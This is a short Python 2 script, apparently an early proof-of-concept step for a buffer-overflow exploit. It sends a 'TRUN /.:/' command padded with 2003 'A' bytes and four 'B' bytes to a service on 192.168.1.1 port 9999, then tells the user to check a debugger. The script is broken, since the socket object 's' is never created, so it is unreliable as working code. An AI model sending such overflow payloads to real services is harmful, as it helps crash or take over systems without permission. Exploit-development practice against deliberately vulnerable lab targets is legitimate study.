#!/usr/bin/python
import socket
import sys

shellcode= "A" * 2003 + "B" * 4
try:
	connect=s.connect(('192.168.1.1',9999))
	s.send(('TRUN /.:/' + shellcode))
except:
	print"check debugger"
s.close()